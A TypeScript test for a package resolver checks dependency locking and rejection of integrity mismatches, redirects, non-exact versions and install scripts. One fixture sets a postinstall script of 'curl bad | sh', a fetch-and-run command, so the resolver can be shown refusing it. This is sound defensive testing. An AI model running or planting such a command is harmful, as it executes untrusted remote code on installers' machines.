import assert from 'node:assert/strict';
import {test} from 'node:test';
import {inspectPackage, resolvePackage} from '../packages/package-install/src/resolver.ts';
import {packageFixture} from './helpers/package-fixture.ts';

test('package resolution locks transitive dependencies and rejects integrity, redirect and script failures before build', async () => {
  const original = globalThis.fetch;
  try {
    const root = packageFixture({dependencies: {'fixture-dependency': '^1.0.0', react: '^18.3.1'}});
    const dependency = packageFixture({name: 'fixture-dependency', version: '1.0.2'});
    let corrupt = false;
    globalThis.fetch = (async (input: string | URL | Request, init?: RequestInit) => {
      assert.equal(init?.redirect, 'manual');
      const address = String(input);
      if (address === root.manifest.dist.tarball) return new Response(corrupt ? new Uint8Array([1, 2]) : new Uint8Array(root.bytes));
      if (address === dependency.manifest.dist.tarball) return new Response(new Uint8Array(dependency.bytes));
      if (decodeURIComponent(new URL(address).pathname) === '/fixture-dependency') return Response.json({versions: {'1.0.2': dependency.manifest}});
      return Response.json(root.manifest);
    }) as typeof fetch;
    const resolved = await resolvePackage(`${root.name}@${root.version}`, AbortSignal.timeout(5000));
    assert.deepEqual(resolved.lock.map(row => row.name), [root.name, dependency.name].sort((a, b) => a.localeCompare(b)));
    assert.equal(resolved.packages.length, 2, 'React is supplied by the reviewed browser SDK');
    corrupt = true;
    await assert.rejects(resolvePackage(`${root.name}@${root.version}`, AbortSignal.timeout(5000)), /integrity mismatch/);
    const scripted = packageFixture({scripts: {postinstall: 'curl bad | sh'}});
    globalThis.fetch = (async () => Response.json(scripted.manifest)) as typeof fetch;
    await assert.rejects(inspectPackage(`${root.name}@${root.version}`, AbortSignal.timeout(5000)), /installation scripts/);
    globalThis.fetch = (async () => new Response(null, {status: 302, headers: {location: 'https://elsewhere.test'}})) as typeof fetch;
    await assert.rejects(inspectPackage(`${root.name}@${root.version}`, AbortSignal.timeout(5000)), /HTTP 302/);
    await assert.rejects(inspectPackage(`${root.name}@latest`, AbortSignal.timeout(5000)), /exact public npm version/);
  } finally {globalThis.fetch = original;}
});
